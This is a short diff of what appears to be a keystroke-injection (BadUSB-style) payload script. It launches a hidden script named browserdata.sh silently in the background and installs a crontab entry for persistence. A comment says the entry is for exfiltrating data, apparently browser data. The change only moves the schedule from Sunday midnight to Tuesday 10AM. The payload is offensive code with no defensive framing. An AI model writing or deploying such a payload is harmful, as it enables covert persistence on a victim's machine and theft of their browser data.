@@ -25,8 +25,8 @@ DELAY 500
 STRING ((sh ~/.hidden/browserdata.sh &> /dev/null &)&)
 ENTER
 
-REM Setup persistence and efil data at 00:00 every Sunday
-STRING chmod +x ~/.hidden/browserdata.sh && echo "0 0 * * 0 ~/.hidden/browserdata.sh" | crontab -
+REM Setup persistence and efil data at 10AM every Tuesday
+STRING chmod +x ~/.hidden/browserdata.sh && echo "0 10 * * 2 ~/.hidden/browserdata.sh" | crontab -
 ENTER
 
 REM Quit terminal
